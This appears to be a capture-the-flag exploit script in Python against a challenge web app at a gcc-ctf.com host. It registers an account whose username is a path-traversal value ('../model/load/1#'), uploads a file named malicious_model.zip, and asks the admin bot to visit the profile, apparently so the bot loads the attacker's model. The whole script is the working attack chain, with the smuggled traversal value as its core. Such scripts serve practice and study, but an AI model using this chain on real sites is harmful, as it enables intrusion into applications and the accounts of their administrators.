#!/usr/bin/env python
import requests


BASE_URL = "http://127.0.0.1:5000"
BASE_URL = "http://worker02.gcc-ctf.com:12361"

sess = requests.Session()

def register(username, password):
    resp = sess.post(BASE_URL + "/register", data={"username": username, "password": password})
    # print(resp.text)

def login(username, password):
    resp = sess.post(BASE_URL + "/login", data={"username": username, "password": password})
    # print(resp.text)

def report_bot(user_id):
    resp = sess.get(BASE_URL + f"/profile/visit?user_id={user_id}")
    # print(resp.text)

def upload_model(file_name, model_path):
    resp = sess.post(BASE_URL + "/upload", files={"file": (file_name, open(model_path, "rb").read())})
    # print(resp.text)


if __name__ == "__main__":
    admin_user_id = 1
    exploit_user_id = 2
    exploit_model_id = 1

    username = f"../model/load/{exploit_model_id}#"
    password = "password"

    register(username, password)
    login(username, password)
    upload_model("example_model.zip", "./malicious_model.zip")
    report_bot(exploit_user_id)
